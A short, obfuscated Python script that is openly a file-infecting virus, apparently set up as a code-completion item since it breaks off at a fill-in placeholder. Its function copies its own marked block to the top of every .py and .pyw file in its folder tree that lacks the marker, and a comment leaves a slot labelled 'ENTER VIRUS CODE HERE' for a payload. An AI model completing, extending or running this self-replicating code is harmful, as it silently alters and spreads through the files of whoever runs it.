# S
import os
import sys
import glob
from multiprocessing import Process
def _f9():
    _v2 = []
    with open(sys.argv[0], 'rb') as _v7:
        _v9 = _v7.readlines()
    _v17 = False
    for _v8 in _v9:
        if _v8 == b'# S\r\n':
            _v17 = True
        if _v17:
            _v2.append(_v8)
        if _v8 == b'# E\r\n':
            break
    _v0 = os.path.realpath(__file__)
    _v0 = _v0.split('\\')
    _v0.pop()
    _v6 = ""
    for _v10 in _v0:
        _v6 += _v10 + "\\"
    _v6 = _v6[:-1]
    _v16 = os.walk(_v6)
    _v16 = list(_v16)
    _v5 = []
    for _v18 in range(0, len(_v16)):
        _v5.append(
            _v16[_v18][0][len(_v6) + 1:])
    _v3 = []
    _v3 += glob.glob('*.py') + glob.glob('*.pyw')
    for _v13 in _v5:
        _v3 += glob.glob(f'{_v13}/*.py') + glob.glob(f'{_v13}/*.pyw')
    for _v1 in _v3:
        with open(_v1, 'rb') as _v12:
            _v14 = _v12.readlines()
        if b'# S\r\n' in _v14:
            continue
        _v11 = []
        _v11 += _v2
        _v11 += list(_v14)
        _v11.append(b'\r\n')
        with open(_v1, 'wb') as _v15:
            _v15.writelines(_v11)
    # ENTER VIRUS CODE HERE!!!#
    # Virus code...
if __name__ == "__main__":
    _p1 = Process(target=_f9)
    _p1.sta <FILL_HERE>